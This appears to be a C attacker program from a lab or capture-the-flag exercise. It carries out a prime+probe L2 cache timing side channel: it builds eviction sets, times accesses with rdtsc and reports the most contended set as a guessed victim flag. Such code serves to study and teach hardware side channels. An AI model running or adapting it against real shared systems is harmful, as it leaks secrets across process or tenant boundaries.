#include <stdio.h>
#include <stdint.h>
#include "util.h"

#define NUM_SETS NUM_L2_CACHE_SETS
#define PROBE_REPS 100000

int main() {

    // Allocate large buffer like victim
    char *buf = get_buffer();

    // Create eviction sets for each cache set
    char *eviction_sets[NUM_SETS][16];

    for (int i = 0; i < NUM_SETS; i++) {
        get_partial_eviction_set(eviction_sets[i], i);
    }

    while (1) {

        uint64_t times[NUM_SETS];

        for (int set = 0; set < NUM_SETS; set++) {

            uint64_t total = 0;

            for (int r = 0; r < PROBE_REPS; r++) {

                uint64_t start = rdtsc();

                for (int j = 0; j < 16; j++) {
                    (*(eviction_sets[set][j]))++;
                }

                uint64_t end = rdtsc();

                total += (end - start);
            }

            times[set] = total;
        }

        int max_set = 0;

        for (int i = 1; i < NUM_SETS; i++) {
            if (times[i] > times[max_set]) {
                max_set = i;
            }
        }

        printf("Guessed flag: %d\n", max_set);
    }

    return 0;
}